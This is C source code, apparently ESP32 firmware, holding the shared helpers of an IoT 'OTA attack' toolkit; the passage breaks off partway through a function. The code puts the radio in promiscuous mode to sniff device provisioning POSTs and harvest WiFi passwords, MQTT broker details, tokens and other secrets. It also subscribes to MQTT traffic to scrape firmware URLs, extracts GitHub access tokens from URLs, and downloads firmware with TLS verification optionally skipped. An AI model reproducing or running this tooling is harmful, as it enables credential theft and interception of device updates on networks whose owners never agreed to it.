/*
 * ota_common.c - Shared helpers for OTA attack modules
 */

#include "ota_common.h"
#include "heap_psram.h"

#include "esp_log.h"
#include "esp_timer.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_http_client.h"
#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>

static const char *TAG = "ota_common";

/* ---- Claim ---- */
static SemaphoreHandle_t s_claim_mtx = NULL;
static bool s_claimed = false;
static char s_claim_owner[32] = "";

/* ---- Semaphores / WiFi MQTT ---- */
static SemaphoreHandle_t s_wifi_sem = NULL;
static SemaphoreHandle_t s_mqtt_sem = NULL;
static SemaphoreHandle_t s_download_sem = NULL;
static volatile bool s_wifi_connected = false;
static volatile bool s_wifi_has_ip = false;
static esp_mqtt_client_handle_t s_mqtt = NULL;
static volatile bool s_mqtt_connected = false;
static ota_mqtt_data_hook_t s_mqtt_hook = NULL;
static ota_conn_params_t s_conn;
static bool s_wifi_handlers_reg = false;

/* ---- Capture ---- */
static ota_msg_entry_t s_msgs[OTA_MAX_CAPTURED_MSGS];
static int s_msg_head = 0;
static int s_msg_count = 0;
static volatile uint32_t s_mqtt_msg_count = 0;

static ota_url_entry_t s_urls[OTA_MAX_CAPTURED_URLS];
static int s_url_entries = 0;
static volatile uint32_t s_url_count = 0;
static volatile uint32_t s_github_url_count = 0;

static char s_download_result_json[512] = "";
static uint8_t *s_firmware = NULL;
static uint32_t s_firmware_size = 0;
static volatile uint32_t s_download_count = 0;

static ota_dns_entry_t s_dns[OTA_MAX_DNS_ENTRIES];
static int s_dns_count_entries = 0;
static ota_http_entry_t s_http[OTA_MAX_HTTP_ENTRIES];
static int s_http_count_entries = 0;
static volatile uint32_t s_dns_count = 0;
static volatile uint32_t s_http_count = 0;
static volatile uint32_t s_ota_dns_count = 0;
static volatile uint32_t s_ota_http_count = 0;

/* ---- Sniffer ---- */
static ota_sniffer_opts_t s_sniff_opts;
static ota_prov_cred_t *s_prov_creds = NULL;
static int *s_prov_cred_count = NULL;
static volatile uint32_t *s_prov_sensitive = NULL;
static ota_prov_summary_t *s_prov_summary = NULL;
static void (*s_prov_on_captured)(void) = NULL;
static volatile bool s_sniffer_active = false;

/* ---- PSRAM ---- */
#define OTA_JSON_SMALL_COUNT 5
static char *s_json_small[OTA_JSON_SMALL_COUNT];
static char *s_json_med = NULL;
static char *s_json_med_b = NULL;
static char *s_json_large_a = NULL;
static char *s_json_large_b = NULL;
static char *s_json_tiny = NULL;
static char *s_json_2k = NULL;
static char *s_json_result = NULL;
static char *s_http_recv = NULL;
static char *s_gh_api_resp = NULL;
static int s_gh_api_resp_len = 0;

/* Packet headers */
typedef struct __attribute__((packed)) {
    uint8_t version_ihl;
    uint8_t tos;
    uint16_t total_len;
    uint16_t id;
    uint16_t flags_offset;
    uint8_t ttl;
    uint8_t protocol;
    uint16_t checksum;
    uint32_t src_ip;
    uint32_t dst_ip;
} min_ip_hdr_t;

typedef struct __attribute__((packed)) {
    uint16_t src_port;
    uint16_t dst_port;
    uint16_t length;
    uint16_t checksum;
} min_udp_hdr_t;

typedef struct __attribute__((packed)) {
    uint16_t src_port;
    uint16_t dst_port;
    uint32_t seq_num;
    uint32_t ack_num;
    uint8_t data_offset_flags;
    uint8_t flags;
    uint16_t window;
    uint16_t checksum;
    uint16_t urgent_ptr;
} min_tcp_hdr_t;

/* Forward */
static void wifi_event_handler(void *arg, esp_event_base_t base, int32_t id, void *data);
static void mqtt_event_handler(void *args, esp_event_base_t base, int32_t id, void *data);
static void wifi_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type);
static esp_err_t http_fw_event_cb(esp_http_client_event_t *evt);
static bool alloc_psram(void);

int64_t ota_common_now_ms(void)
{
    return (int64_t)esp_timer_get_time() / 1000;
}

void ota_common_init(void)
{
    if (!s_claim_mtx) s_claim_mtx = xSemaphoreCreateMutex();
    if (!s_wifi_sem) s_wifi_sem = xSemaphoreCreateBinary();
    if (!s_mqtt_sem) s_mqtt_sem = xSemaphoreCreateBinary();
    if (!s_download_sem) s_download_sem = xSemaphoreCreateBinary();
    memset(&s_sniff_opts, 0, sizeof(s_sniff_opts));
    s_sniff_opts.capture_dns = true;
    s_sniff_opts.capture_http = true;
    if (!alloc_psram()) {
        ESP_LOGW(TAG, "PSRAM buffer alloc incomplete");
    }
    ESP_LOGI(TAG, "OTA common initialized");
}

esp_err_t ota_common_try_claim(const char *owner)
{
    if (!s_claim_mtx) return ESP_ERR_INVALID_STATE;
    if (xSemaphoreTake(s_claim_mtx, pdMS_TO_TICKS(1000)) != pdTRUE) {
        return ESP_ERR_TIMEOUT;
    }
    if (s_claimed) {
        xSemaphoreGive(s_claim_mtx);
        return ESP_ERR_INVALID_STATE;
    }
    s_claimed = true;
    strncpy(s_claim_owner, owner ? owner : "?", sizeof(s_claim_owner) - 1);
    s_claim_owner[sizeof(s_claim_owner) - 1] = '\0';
    xSemaphoreGive(s_claim_mtx);
    return ESP_OK;
}

void ota_common_release(void)
{
    if (!s_claim_mtx) return;
    if (xSemaphoreTake(s_claim_mtx, pdMS_TO_TICKS(1000)) == pdTRUE) {
        s_claimed = false;
        s_claim_owner[0] = '\0';
        xSemaphoreGive(s_claim_mtx);
    }
}

bool ota_common_is_claimed(void)
{
    return s_claimed;
}

const char *ota_common_claim_owner(void)
{
    return s_claim_owner;
}

static bool alloc_psram(void)
{
    for (int i = 0; i < OTA_JSON_SMALL_COUNT; i++) {
        if (!s_json_small[i]) s_json_small[i] = heap_psram_malloc(OTA_JSON_SMALL_SZ);
        if (!s_json_small[i]) return false;
    }
    if (!s_json_med) s_json_med = heap_psram_malloc(OTA_JSON_MED_SZ);
    if (!s_json_med_b) s_json_med_b = heap_psram_malloc(OTA_JSON_MED_SZ);
    if (!s_json_large_a) s_json_large_a = heap_psram_malloc(OTA_JSON_LARGE_SZ);
    if (!s_json_large_b) s_json_large_b = heap_psram_malloc(OTA_JSON_LARGE_SZ);
    if (!s_json_tiny) s_json_tiny = heap_psram_malloc(OTA_JSON_TINY_SZ);
    if (!s_json_2k) s_json_2k = heap_psram_malloc(OTA_JSON_2K_SZ);
    if (!s_json_result) s_json_result = heap_psram_malloc(OTA_JSON_2K_SZ);
    if (!s_http_recv) s_http_recv = heap_psram_malloc(OTA_HTTP_RECV_BUFFER_SIZE);
    if (!s_gh_api_resp) s_gh_api_resp = heap_psram_malloc(OTA_GH_API_RESP_LEN);
    return s_json_med && s_json_med_b && s_json_large_a && s_json_large_b &&
           s_json_tiny && s_json_2k && s_json_result && s_http_recv && s_gh_api_resp;
}

char *ota_common_json_slot(int idx)
{
    if (idx < 0 || idx >= OTA_JSON_SMALL_COUNT) return NULL;
    if (!s_json_small[idx]) s_json_small[idx] = heap_psram_malloc(OTA_JSON_SMALL_SZ);
    return s_json_small[idx];
}
char *ota_common_json_med(void) { return s_json_med; }
char *ota_common_json_med_b(void) { return s_json_med_b; }
char *ota_common_json_large_a(void) { return s_json_large_a; }
char *ota_common_json_large_b(void) { return s_json_large_b; }
char *ota_common_json_tiny(void) { return s_json_tiny; }
char *ota_common_json_2k(void) { return s_json_2k; }
char *ota_common_json_result(void) { return s_json_result; }
char *ota_common_http_recv_buffer(void) { return s_http_recv; }
char *ota_common_gh_api_resp_buf(void) { return s_gh_api_resp; }
int *ota_common_gh_api_resp_len_ptr(void) { return &s_gh_api_resp_len; }

bool ota_common_is_github_url(const char *url)
{
    if (!url || !url[0]) return false;
    return strstr(url, "github.com") || strstr(url, "githubusercontent.com") ||
           strstr(url, "api.github.com") || strstr(url, "raw.githubusercontent.com");
}

void ota_common_extract_github_token(const char *url, char *token_out, size_t token_len)
{
    if (!url || !token_out || token_len == 0) return;
    token_out[0] = '\0';
    const char *patterns[] = { "token=", "access_token=", "private_token=" };
    for (int p = 0; p < 3; p++) {
        const char *pos = strstr(url, patterns[p]);
        if (!pos) continue;
        pos += strlen(patterns[p]);
        size_t i = 0;
        while (i < token_len - 1 && pos[i] && pos[i] != '&' && pos[i] != '?' &&
               pos[i] != ' ' && pos[i] != '"') {
            token_out[i] = pos[i];
            i++;
        }
        token_out[i] = '\0';
        return;
    }
}

bool ota_common_is_ota_domain(const char *domain)
{
    if (!domain || !domain[0]) return false;
    const char *patterns[] = {
        "ota", "update", "firmware", "upgrade", "release",
        "download", "deploy", "artifact", "binary",
        "github.com", "githubusercontent.com", "api.github.com",
        "aws", "cloudfront", "s3.amazonaws", "blob.core.windows",
        "storage.googleapis", "firebase", "azureedge", NULL
    };
    for (int i = 0; patterns[i]; i++) {
        if (strstr(domain, patterns[i])) return true;
    }
    return false;
}

bool ota_common_is_ota_http_url(const char *url)
{
    if (!url || !url[0]) return false;
    const char *patterns[] = {
        "ota", "update", "firmware", "upgrade", "release",
        "download", "version", "check", "latest", "deploy",
        "artifact", "binary", "github.com", "githubusercontent", NULL
    };
    for (int i = 0; patterns[i]; i++) {
        if (strstr(url, patterns[i])) return true;
    }
    return false;
}

void ota_common_capture_reset(void)
{
    s_mqtt_msg_count = 0;
    s_url_count = 0;
    s_github_url_count = 0;
    s_msg_head = 0;
    s_msg_count = 0;
    s_url_entries = 0;
    s_download_result_json[0] = '\0';
    ota_common_clear_firmware();
    ota_common_dns_http_reset();
}

void ota_common_dns_http_reset(void)
{
    s_dns_count_entries = 0;
    s_http_count_entries = 0;
    s_dns_count = 0;
    s_http_count = 0;
    s_ota_dns_count = 0;
    s_ota_http_count = 0;
}

void ota_common_store_message(const char *topic, int topic_len,
                              const char *payload, int payload_len)
{
    ota_msg_entry_t *slot = &s_msgs[s_msg_head];
    slot->timestamp_ms = ota_common_now_ms();
    int tlen = topic_len < OTA_MAX_TOPIC_LEN - 1 ? topic_len : OTA_MAX_TOPIC_LEN - 1;
    memcpy(slot->topic, topic, tlen);
    slot->topic[tlen] = '\0';
    int plen = payload_len < OTA_MAX_PAYLOAD_LEN - 1 ? payload_len : OTA_MAX_PAYLOAD_LEN - 1;
    memcpy(slot->payload, payload, plen);
    slot->payload[plen] = '\0';
    s_msg_head = (s_msg_head + 1) % OTA_MAX_CAPTURED_MSGS;
    if (s_msg_count < OTA_MAX_CAPTURED_MSGS) s_msg_count++;
    s_mqtt_msg_count++;
}

void ota_common_scan_payload_for_urls(const char *topic, const char *payload, int payload_len)
{
    if (!payload || payload_len <= 0) return;
    char *buf = heap_psram_malloc(payload_len + 1);
    if (!buf) return;
    memcpy(buf, payload, payload_len);
    buf[payload_len] = '\0';

    const char *url_patterns[] = {
        "\"url\":", "\"download_url\":", "\"firmware_url\":",
        "\"update_url\":", "\"ota_url\":", "\"binary_url\":",
        "\"file_url\":", "\"release_url\":", "\"href\":",
        "\"repo_url\":", "\"clone_url\":", NULL
    };

    for (int i = 0; url_patterns[i]; i++) {
        const char *pos = strstr(buf, url_patterns[i]);
        while (pos) {
            pos += strlen(url_patterns[i]);
            while (*pos == ' ' || *pos == ':' || *pos == '"') pos++;
            char url[OTA_MAX_URL_LEN] = "";
            int ui = 0;
            while (pos[ui] && pos[ui] != '"' && pos[ui] != '\'' && pos[ui] != ',' &&
                   pos[ui] != '}' && pos[ui] != ' ' && ui < OTA_MAX_URL_LEN - 1) {
                url[ui] = pos[ui];
                ui++;
            }
            url[ui] = '\0';
            if (ui > 10 && (strstr(url, "http://") == url || strstr(url, "https://") == url)) {
                ota_common_add_url_from_sniff(url, topic ? topic : "");
            }
            pos = strstr(pos + ui, url_patterns[i]);
        }
    }

    const char *http_pos = buf;
    while (1) {
        const char *p1 = strstr(http_pos, "https://");
        const char *p2 = strstr(http_pos, "http://");
        if (!p1 && !p2) break;
        if (!p1) http_pos = p2;
        else if (!p2) http_pos = p1;
        else http_pos = (p1 < p2) ? p1 : p2;

        char url[OTA_MAX_URL_LEN] = "";
        int ui = 0;
        while (http_pos[ui] && http_pos[ui] != '"' && http_pos[ui] != '\'' &&
               http_pos[ui] != ',' && http_pos[ui] != '}' && http_pos[ui] != ' ' &&
               http_pos[ui] != '\\' && ui < OTA_MAX_URL_LEN - 1) {
            url[ui] = http_pos[ui];
            ui++;
        }
        url[ui] = '\0';
        if (ui > 10) {
            bool dup = false;
            for (int j = 0; j < s_url_entries; j++) {
                if (strcmp(s_urls[j].url, url) == 0) { dup = true; break; }
            }
            if (!dup) ota_common_add_url_from_sniff(url, topic ? topic : "");
        }
        http_pos += ui > 0 ? ui : 1;
        if (ui == 0) break;
    }
    free(buf);
}

void ota_common_add_url_from_sniff(const char *url, const char *source)
{
    if (!url || s_url_entries >= OTA_MAX_CAPTURED_URLS) return;
    ota_url_entry_t *e = &s_urls[s_url_entries];
    strncpy(e->url, url, OTA_MAX_URL_LEN - 1);
    e->url[OTA_MAX_URL_LEN - 1] = '\0';
    strncpy(e->source_topic, source ? source : "", OTA_MAX_TOPIC_LEN - 1);
    e->source_topic[OTA_MAX_TOPIC_LEN - 1] = '\0';
    e->timestamp_ms = ota_common_now_ms();
    e->has_github_token = false;
    e->downloaded = false;
    e->firmware_size = 0;
    if (ota_common_is_github_url(url)) {
        char tok[96] = "";
        ota_common_extract_github_token(url, tok, sizeof(tok));
        e->has_github_token = (tok[0] != '\0');
        s_github_url_count++;
    }
    s_url_entries++;
    s_url_count++;
}

uint32_t ota_common_get_mqtt_msg_count(void) { return s_mqtt_msg_count; }
uint32_t ota_common_get_url_count(void) { return s_url_count; }
uint32_t ota_common_get_github_url_count(void) { return s_github_url_count; }
int ota_common_get_msg_count(void) { return s_msg_count; }
int ota_common_get_url_entries(void) { return s_url_entries; }
const ota_msg_entry_t *ota_common_get_msgs(void) { return s_msgs; }
ota_url_entry_t *ota_common_get_urls(void) { return s_urls; }

const char *ota_common_get_messages_json(void)
{
    char *buf = ota_common_json_med();
    if (!buf) return "[]";
    int off = snprintf(buf, OTA_JSON_MED_SZ, "[");
    for (int i = 0; i < s_msg_count && off < OTA_JSON_MED_SZ - 64; i++) {
        int idx = (s_msg_count < OTA_MAX_CAPTURED_MSGS)
                      ? i
                      : (s_msg_head + i) % OTA_MAX_CAPTURED_MSGS;
        const ota_msg_entry_t *m = &s_msgs[idx];
        if (i) off += snprintf(buf + off, OTA_JSON_MED_SZ - off, ",");
        off += snprintf(buf + off, OTA_JSON_MED_SZ - off,
                        "{\"topic\":\"%s\",\"payload\":\"%s\",\"timestamp_ms\":%lld}",
                        m->topic, m->payload, (long long)m->timestamp_ms);
    }
    snprintf(buf + off, OTA_JSON_MED_SZ - off, "]");
    return buf;
}

const char *ota_common_get_urls_json(void)
{
    char *buf = ota_common_json_med_b();
    if (!buf) return "[]";
    int off = 0;
    off += snprintf(buf + off, OTA_JSON_MED_SZ - off, "[");
    for (int i = 0; i < s_url_entries && off < OTA_JSON_MED_SZ - 64; i++) {
        ota_url_entry_t *u = &s_urls[i];
        if (i) off += snprintf(buf + off, OTA_JSON_MED_SZ - off, ",");
        off += snprintf(buf + off, OTA_JSON_MED_SZ - off,
                        "{\"url\":\"%s\",\"source\":\"%s\",\"timestamp_ms\":%lld,"
                        "\"has_github_token\":%s,\"downloaded\":%s,\"firmware_size\":%u}",
                        u->url, u->source_topic, (long long)u->timestamp_ms,
                        u->has_github_token ? "true" : "false",
                        u->downloaded ? "true" : "false",
                        (unsigned)u->firmware_size);
    }
    snprintf(buf + off, OTA_JSON_MED_SZ - off, "]");
    return buf;
}

const char *ota_common_get_github_urls_json(void)
{
    char *buf = ota_common_json_tiny();
    if (!buf) return "[]";
    int off = 0;
    off += snprintf(buf + off, OTA_JSON_TINY_SZ - off, "[");
    int first = 1;
    for (int i = 0; i < s_url_entries && off < OTA_JSON_TINY_SZ - 96; i++) {
        if (!ota_common_is_github_url(s_urls[i].url)) continue;
        if (!first) off += snprintf(buf + off, OTA_JSON_TINY_SZ - off, ",");
        first = 0;
        off += snprintf(buf + off, OTA_JSON_TINY_SZ - off,
                        "{\"index\":%d,\"url\":\"%s\",\"source\":\"%s\","
                        "\"has_github_token\":%s}",
                        i, s_urls[i].url, s_urls[i].source_topic,
                        s_urls[i].has_github_token ? "true" : "false");
    }
    snprintf(buf + off, OTA_JSON_TINY_SZ - off, "]");
    return buf;
}

/* ---- Firmware download ---- */

static esp_err_t http_fw_event_cb(esp_http_client_event_t *evt)
{
    if (evt->event_id == HTTP_EVENT_ON_DATA && s_firmware &&
        s_firmware_size + evt->data_len <= OTA_MAX_FIRMWARE_DOWNLOAD_SIZE) {
        memcpy(s_firmware + s_firmware_size, evt->data, evt->data_len);
        s_firmware_size += evt->data_len;
    }
    return ESP_OK;
}

void ota_common_clear_firmware(void)
{
    if (s_firmware) {
        heap_psram_free(s_firmware);
        s_firmware = NULL;
    }
    s_firmware_size = 0;
}

esp_err_t ota_common_download_firmware(const char *url, bool verify_ssl)
{
    if (!url || !url[0]) return ESP_ERR_INVALID_ARG;
    ESP_LOGI(TAG, "Downloading firmware: %s", url);
    ota_common_clear_firmware();
    s_firmware = heap_psram_malloc(OTA_MAX_FIRMWARE_DOWNLOAD_SIZE);
    if (!s_firmware) return ESP_ERR_NO_MEM;
    s_firmware_size = 0;

    esp_http_client_config_t http_cfg = {
        .url = url,
        .event_handler = http_fw_event_cb,
        .timeout_ms = 30000,
        .buffer_size = OTA_HTTP_RECV_BUFFER_SIZE,
        .user_data = s_http_recv,
    };
    if (!verify_ssl) {
        http_cfg.skip_cert_common_name_check = true;
        http_cfg.cert_pem = NULL;
    }
    esp_http_client_handle_t client = esp_http_client_init(&http_cfg);
    if (!client) {
        ota_common_clear_firmware();
        return ESP_FAIL;
    }
    esp_err_t err = esp_http_client_perform(client);
    int status = esp_http_client_get_status_code(client);
    if (err == ESP_OK && (status == 200 || status == 302)) {
        s_download_count++;
        for (int i = 0; i < s_url_entries; i++) {
            if (strcmp(s_urls[i].url, url) == 0) {
                s_urls[i].downloaded = true;
                s_urls[i].firmware_size = s_firmware_size;
            }
        }
        snprintf(s_download_result_json, sizeof(s_download_result_json),
                 "{\"success\":true,\"url\":\"%s\",\"size\":%u,\"status\":%d}",
                 url, (unsigned)s_firmware_size, status);
    } else {
        snprintf(s_download_result_json, sizeof(s_download_result_json),
                 "{\"success\":false,\"url\":\"%s\",\"status\":%d,\"error\":\"HTTP %d\"}",
                 url, status, status);
        ota_common_clear_firmware();
        err = ESP_FAIL;
    }
    esp_http_client_cleanup(client);
    if (s_download_sem) xSemaphoreGive(s_download_sem);
    return err;
}

const char *ota_common_get_download_result_json(void)
{
    return s_download_result_json[0] ? s_download_result_json : "{\"success\":false}";
}

uint8_t *ota_common_get_firmware_buffer(uint32_t *size_out)
{
    if (size_out) *size_out = s_firmware_size;
    return s_firmware;
}

uint32_t ota_common_get_download_count(void) { return s_download_count; }

/* ---- DNS/HTTP ---- */

ota_dns_entry_t *ota_common_get_dns_entries(int *count_out)
{
    if (count_out) *count_out = s_dns_count_entries;
    return s_dns;
}
ota_http_entry_t *ota_common_get_http_entries(int *count_out)
{
    if (count_out) *count_out = s_http_count_entries;
    return s_http;
}
uint32_t ota_common_get_dns_count(void) { return s_dns_count; }
uint32_t ota_common_get_http_count(void) { return s_http_count; }
uint32_t ota_common_get_ota_dns_count(void) { return s_ota_dns_count; }
uint32_t ota_common_get_ota_http_count(void) { return s_ota_http_count; }

void ota_common_add_dns_entry(const ota_dns_entry_t *e)
{
    if (!e || s_dns_count_entries >= OTA_MAX_DNS_ENTRIES) return;
    s_dns[s_dns_count_entries++] = *e;
    s_dns_count++;
    if (e->is_ota_related) s_ota_dns_count++;
}

void ota_common_add_http_entry(const ota_http_entry_t *e)
{
    if (!e || s_http_count_entries >= OTA_MAX_HTTP_ENTRIES) return;
    s_http[s_http_count_entries++] = *e;
    s_http_count++;
    if (e->is_ota_related) s_ota_http_count++;
}

const char *ota_common_get_dns_entries_json(void)
{
    char *buf = ota_common_json_slot(0);
    if (!buf) return "[]";
    int off = snprintf(buf, OTA_JSON_SMALL_SZ, "[");
    for (int i = 0; i < s_dns_count_entries && off < OTA_JSON_SMALL_SZ - 80; i++) {
        ota_dns_entry_t *e = &s_dns[i];
        if (i) off += snprintf(buf + off, OTA_JSON_SMALL_SZ - off, ",");
        off += snprintf(buf + off, OTA_JSON_SMALL_SZ - off,
                        "{\"domain\":\"%s\",\"ota\":%s,\"timestamp_ms\":%lld}",
                        e->domain, e->is_ota_related ? "true" : "false",
                        (long long)e->timestamp_ms);
    }
    snprintf(buf + off, OTA_JSON_SMALL_SZ - off, "]");
    return buf;
}

const char *ota_common_get_http_entries_json(void)
{
    char *buf = ota_common_json_slot(1);
    if (!buf) return "[]";
    int off = snprintf(buf, OTA_JSON_SMALL_SZ, "[");
    for (int i = 0; i < s_http_count_entries && off < OTA_JSON_SMALL_SZ - 80; i++) {
        ota_http_entry_t *e = &s_http[i];
        if (i) off += snprintf(buf + off, OTA_JSON_SMALL_SZ - off, ",");
        off += snprintf(buf + off, OTA_JSON_SMALL_SZ - off,
                        "{\"method\":\"%s\",\"url\":\"%s\",\"ota\":%s,\"timestamp_ms\":%lld}",
                        e->method, e->full_url, e->is_ota_related ? "true" : "false",
                        (long long)e->timestamp_ms);
    }
    snprintf(buf + off, OTA_JSON_SMALL_SZ - off, "]");
    return buf;
}

/* ---- WiFi ---- */

static void wifi_event_handler(void *arg, esp_event_base_t base, int32_t id, void *data)
{
    (void)arg;
    if (base == WIFI_EVENT) {
        if (id == WIFI_EVENT_STA_START) {
            esp_wifi_connect();
        } else if (id == WIFI_EVENT_STA_CONNECTED) {
            s_wifi_connected = true;
        } else if (id == WIFI_EVENT_STA_DISCONNECTED) {
            s_wifi_connected = false;
            s_wifi_has_ip = false;
            if (s_claimed) esp_wifi_connect();
        }
    } else if (base == IP_EVENT && id == IP_EVENT_STA_GOT_IP) {
        s_wifi_has_ip = true;
        if (s_wifi_sem) xSemaphoreGive(s_wifi_sem);
    }
}

esp_err_t ota_common_wifi_connect(const ota_conn_params_t *p)
{
    if (!p || !p->wifi_ssid[0]) return ESP_ERR_INVALID_ARG;
    s_conn = *p;
    if (!s_wifi_handlers_reg) {
        esp_event_handler_instance_t a, b;
        esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID,
                                            &wifi_event_handler, NULL, &a);
        esp_event_handler_instance_register(IP_EVENT, IP_EVENT_STA_GOT_IP,
                                            &wifi_event_handler, NULL, &b);
        s_wifi_handlers_reg = true;
    }
    wifi_config_t sta = {0};
    strncpy((char *)sta.sta.ssid, p->wifi_ssid, sizeof(sta.sta.ssid) - 1);
    strncpy((char *)sta.sta.password, p->wifi_password, sizeof(sta.sta.password) - 1);
    sta.sta.threshold.authmode = p->wifi_password[0] ? WIFI_AUTH_WPA2_PSK : WIFI_AUTH_OPEN;
    s_wifi_connected = false;
    s_wifi_has_ip = false;
    esp_wifi_set_mode(WIFI_MODE_APSTA);
    esp_wifi_set_config(ESP_IF_WIFI_STA, &sta);
    esp_wifi_start();
    if (s_wifi_sem) xSemaphoreTake(s_wifi_sem, 0);
    if (xSemaphoreTake(s_wifi_sem, pdMS_TO_TICKS(OTA_WIFI_CONNECT_TIMEOUT_MS)) != pdTRUE) {
        return ESP_ERR_TIMEOUT;
    }
    return ESP_OK;
}

void ota_common_wifi_restore_ap(void)
{
    ota_common_sniffer_enable(false);
    esp_wifi_set_mode(WIFI_MODE_AP);
    esp_wifi_start();
    s_wifi_connected = false;
    s_wifi_has_ip = false;
}

bool ota_common_wifi_has_ip(void) { return s_wifi_has_ip; }

/* ---- MQTT ---- */

static void mqtt_event_handler(void *args, esp_event_base_t base, int32_t id, void *data)
{
    (void)args; (void)base;
    esp_mqtt_event_handle_t event = data;
    switch (id) {
    case MQTT_EVENT_CONNECTED:
        s_mqtt_connected = true;
        if (s_conn.auto_subscribe && s_conn.subscribe_topic[0] && s_mqtt) {
            esp_mqtt_client_subscribe(s_mqtt, s_conn.subscribe_topic, 1);
        }
        if (s_mqtt_sem) xSemaphoreGive(s_mqtt_sem);
        break;
    case MQTT_EVENT_DISCONNECTED:
        s_mqtt_connected = false;
        break;
    case MQTT_EVENT_DATA: {
        char topic[OTA_MAX_TOPIC_LEN] = "";
        int tlen = event->topic_len < OTA_MAX_TOPIC_LEN - 1 ? event->topic_len : OTA_MAX_TOPIC_LEN - 1;
        memcpy(topic, event->topic, tlen);
        topic[tlen] = '\0';
        ota_common_store_message(event->topic, event->topic_len, event->data, event->data_len);
        ota_common_scan_payload_for_urls(topic, event->data, event->data_len);
        if (s_mqtt_hook) s_mqtt_hook(topic, event->data, event->data_len);
        break;
    }
    default:
        break;
    }
}

esp_err_t ota_common_mqtt_connect(const ota_conn_params_t *p, ota_mqtt_data_hook_t hook)
{
    if (!p || !p->mqtt_broker[0]) return ESP_ERR_INVALID_ARG;
    s_conn = *p;
    s_mqtt_hook = hook;
    char uri[192];
    snprintf(uri, sizeof(uri), "mqtt://%s:%u", p->mqtt_broker,
             p->mqtt_port ? p->mqtt_port : OTA_DEFAULT_MQTT_PORT);
    esp_mqtt_client_config_t cfg = {
        .uri = uri,
        .client_id = p->mqtt_client_id[0] ? p->mqtt_client_id : "omega_ota",
    };
    if (p->mqtt_username[0]) {
        cfg.username = p->mqtt_username;
        cfg.password = p->mqtt_password;
    }
    s_mqtt = esp_mqtt_client_init(&cfg);
    if (!s_mqtt) return ESP_FAIL;
    esp_mqtt_client_register_event(s_mqtt, ESP_EVENT_ANY_ID, mqtt_event_handler, NULL);
    esp_mqtt_client_start(s_mqtt);
    if (s_mqtt_sem) xSemaphoreTake(s_mqtt_sem, 0);
    if (xSemaphoreTake(s_mqtt_sem, pdMS_TO_TICKS(OTA_MQTT_CONNECT_TIMEOUT_MS)) != pdTRUE) {
        ota_common_mqtt_disconnect();
        return ESP_ERR_TIMEOUT;
    }
    return ESP_OK;
}

void ota_common_mqtt_disconnect(void)
{
    if (s_mqtt) {
        esp_mqtt_client_stop(s_mqtt);
        esp_mqtt_client_destroy(s_mqtt);
        s_mqtt = NULL;
    }
    s_mqtt_connected = false;
    s_mqtt_hook = NULL;
}

bool ota_common_mqtt_is_connected(void) { return s_mqtt_connected; }
esp_mqtt_client_handle_t ota_common_mqtt_client(void) { return s_mqtt; }

esp_err_t ota_common_mqtt_publish(const char *topic, const char *payload, int qos)
{
    if (!s_mqtt || !s_mqtt_connected || !topic) return ESP_ERR_INVALID_STATE;
    int id = esp_mqtt_client_publish(s_mqtt, topic, payload ? payload : "", 0, qos, 0);
    return id >= 0 ? ESP_OK : ESP_FAIL;
}

/* ---- Sniffer ---- */

void ota_common_sniffer_set_opts(const ota_sniffer_opts_t *opts)
{
    if (opts) s_sniff_opts = *opts;
}

void ota_common_sniffer_set_provision_sink(ota_prov_cred_t *creds, int *cred_count,
                                           volatile uint32_t *sensitive_count,
                                           ota_prov_summary_t *summary,
                                           void (*on_captured)(void))
{
    s_prov_creds = creds;
    s_prov_cred_count = cred_count;
    s_prov_sensitive = sensitive_count;
    s_prov_summary = summary;
    s_prov_on_captured = on_captured;
}

void ota_common_sniffer_enable(bool enable)
{
    s_sniffer_active = enable;
    esp_wifi_set_promiscuous(enable);
    if (enable) {
        esp_wifi_set_promiscuous_rx_cb(wifi_sniffer_cb);
    }
}

static void parse_provision_post(const uint8_t *http_data, int http_len, uint32_t src_ip)
{
    if (!s_sniff_opts.provision_mode || !s_prov_creds || !s_prov_cred_count) return;
    if (*s_prov_cred_count >= OTA_MAX_PROV_CREDS) return;
    const char *body_start = strstr((const char *)http_data, "\r\n\r\n");
    if (!body_start) return;
    body_start += 4;
    int body_len = http_len - (int)(body_start - (const char *)http_data);
    if (body_len <= 10 || body_len >= 2048) return;
    char *body = heap_psram_malloc(body_len + 1);
    if (!body) return;
    memcpy(body, body_start, body_len);
    body[body_len] = '\0';
    cJSON *root = cJSON_Parse(body);
    if (root) {
        cJSON *item = root->child;
        while (item && *s_prov_cred_count < OTA_MAX_PROV_CREDS) {
            ota_prov_cred_t *cred = &s_prov_creds[*s_prov_cred_count];
            const char *val_str = NULL;
            char *tmp = NULL;
            if (cJSON_IsString(item)) val_str = item->valuestring;
            else if (cJSON_IsNumber(item)) {
                tmp = cJSON_PrintUnformatted(item);
                val_str = tmp;
            }
            if (val_str && item->string) {
                strncpy(cred->key, item->string, OTA_MAX_CRED_KEY_LEN - 1);
                strncpy(cred->value, val_str, OTA_MAX_CRED_VALUE_LEN - 1);
                snprintf(cred->source_ip, sizeof(cred->source_ip), "%u.%u.%u.%u",
                         (unsigned)(src_ip >> 24) & 0xFF, (unsigned)(src_ip >> 16) & 0xFF,
                         (unsigned)(src_ip >> 8) & 0xFF, (unsigned)src_ip & 0xFF);
                cred->timestamp_ms = ota_common_now_ms();
                cred->is_sensitive = false;
                const char *sens[] = { "password", "passwd", "pass", "secret",
                                       "token", "key", "credential", "auth", NULL };
                for (int sp = 0; sens[sp]; sp++) {
                    if (strstr(cred->key, sens[sp])) {
                        cred->is_sensitive = true;
                        if (s_prov_sensitive) (*s_prov_sensitive)++;
                        break;
                    }
                }
                (*s_prov_cred_count)++;
                if (s_prov_summary) {
                    if (!strcmp(cred->key, "wifi_ssid") || !strcmp(cred->key, "ssid"))
                        strncpy(s_prov_summary->wifi_ssid, cred->value, sizeof(s_prov_summary->wifi_ssid) - 1);
                    else if (!strcmp(cred->key, "wifi_password") || !strcmp(cred->key, "password"))
                        strncpy(s_prov_summary->wifi_password, cred->value, sizeof(s_prov_summary->wifi_password) - 1);
                    else if (!strcmp(cred->key, "mqtt_broker") || !strcmp(cred->key, "broker"))
                        strncpy(s_prov_summary->mqtt_broker, cred->value, sizeof(s_prov_summary->mqtt_broker) - 1);
                    else if (!strcmp(cred->key, "mqtt_port"))
                        s_prov_summary->mqtt_port = (uint16_t)atoi(cred->value);
